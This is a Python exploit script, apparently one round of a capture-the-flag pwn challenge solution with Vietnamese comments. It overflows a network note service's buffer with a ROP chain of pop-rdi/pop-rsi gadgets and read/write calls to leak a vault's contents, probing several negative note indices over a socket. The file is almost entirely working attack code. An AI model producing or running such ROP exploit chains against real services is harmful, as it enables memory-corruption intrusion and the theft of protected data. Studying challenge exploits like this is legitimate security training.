"""Round 2: đặt size bằng ASCII ngay trong bảng NOTE để nested SUBMIT cho rdx lớn.

NOTE 1 '200'  ->  0x40a1c0 chứa "200\\0"  ->  strtol trả 200  ->  rdx = 200.
"""
import socket
import struct
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import exploit as E  # noqa: E402

NUM = E.NOTE_TABLE + 0x40          # "200"
BIG = 200


def build(idx):
    p = b"A" * 0x48
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", NUM)
    p += struct.pack("<Q", E.SUBMIT)                       # read(0,rsp,200) -> rdx=200
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.NOTE_TABLE)
    p += struct.pack("<Q", E.VAULT_SEND)                   # op=3, len=200
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 3)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
    p += struct.pack("<Q", E.READ_PLT)                     # read(3, REPLY, 200)
    p += struct.pack("<Q", E.POP_RDI) + struct.pack("<Q", 1)
    p += struct.pack("<Q", E.POP_RSI) + struct.pack("<Q", E.REPLY)
    p += struct.pack("<Q", E.WRITE_PLT)                    # write(1, REPLY, rdx)
    p += struct.pack("<Q", E.LOOP)
    assert len(p) <= E.SIZE, len(p)
    return p.ljust(E.SIZE, b"J") + b"\x90" * BIG


def main():
    s = socket.create_connection((E.HOST, E.PORT), timeout=20)
    E.drain(s, 1.0)
    for idx in (0, -1, -2, -3, -4, -5):
        s.sendall(b"NOTE 0 " + struct.pack("<i", idx) + b"PADPAD\n")
        E.drain(s, 0.4)
        s.sendall(b"NOTE 1 200\n")
        E.drain(s, 0.4)
        s.sendall(b"SUBMIT %d\n" % E.SIZE)
        E.drain(s, 0.4)
        s.sendall(build(idx))
        out = E.drain(s, 3.0)
        print("idx=%-3d  %r" % (idx, out[:220]))
    s.close()


if __name__ == "__main__":
    main()
